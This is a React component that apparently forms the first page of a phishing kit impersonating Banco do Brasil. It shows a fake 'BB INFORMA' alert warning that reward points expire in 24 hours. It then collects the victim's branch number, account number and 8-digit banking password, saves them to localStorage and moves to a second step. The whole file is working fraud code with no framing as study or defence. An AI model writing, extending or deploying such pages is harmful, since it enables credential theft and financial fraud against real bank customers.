import React, { useRef, useState } from 'react'
import InputMask from 'react-input-mask';
import {Link} from 'react-router-dom'
import Navbar from '../components/Navbar'
import './PageOne.css'

const PageOne = () => {

  const [agencia, setAgencia] = useState(null)
  const [conta, setConta] = useState(null)
  const [senha8, setSenha8] = useState(null)

  const setStore = () => {
    localStorage.setItem('agencia', agencia);
    localStorage.setItem('conta', conta);
    localStorage.setItem('senha8', senha8);
    window.location.href = '/step2';
  }

  const defineAgencia = (e) => {
    setAgencia(e.target.value)
  }
  const defineConta = (e) => {
    setConta(e.target.value)
  }
  const defineSenha8 = (e) => {
    setSenha8(e.target.value)
  }

  const modalRef = useRef(null)

  const closeModal = () => {
    modalRef.current.style.display = 'none';
  }

  return (
    <div className='page1-frame'>
      <div className='modal' ref={modalRef}>
        <div className='sob-modal'>
          <i className="bi bi-exclamation-circle" id='exclamation-icon'></i>
          <span className='title-alert'>BB INFORMA</span>
          <span className='subtitle-alert'>Prezado (a) cliente, seus pontos vence em 24h. Troque por produtos, milhas ou descontos fatura.</span>
          <span className='resgatar-btn' onClick={() => closeModal()}>RESGATAR PRODUTOS</span>
        </div>
      </div>
      <div className='next-btn-page2' onClick={() => setStore()}>
        <span>CONTINUAR</span>
      </div>
      <Navbar />
      <div className='navegacao-frame'>
        <i className="bi bi-arrow-left" id='arrow-left'></i>
        <span className='title-of-pages'>Acessar conta</span>
      </div>
      <div className='solicitacao-1'>
        <span className='titulo-solicitacao'>Pessoa física</span>
        <span className='subtitulo-solicitacao'>Informe os dados para acessar sua conta:</span>
      </div>
      <div className='entradas-1'>
        <span id='titulo-especifico-edit'>Agência</span>
        <InputMask className='input' mask="9999-9" value={agencia} onChange={defineAgencia} />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Conta</span>
        <InputMask
          className='input'
          value={conta}
          onChange={defineConta}
          mask="99999-9" // Definindo a máscara
      />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Senha de 8 dígitos</span>
        <InputMask className='input' mask="********" value={senha8} type='password' onChange={defineSenha8} />
      </div>
    </div>
  )
}

export default PageOne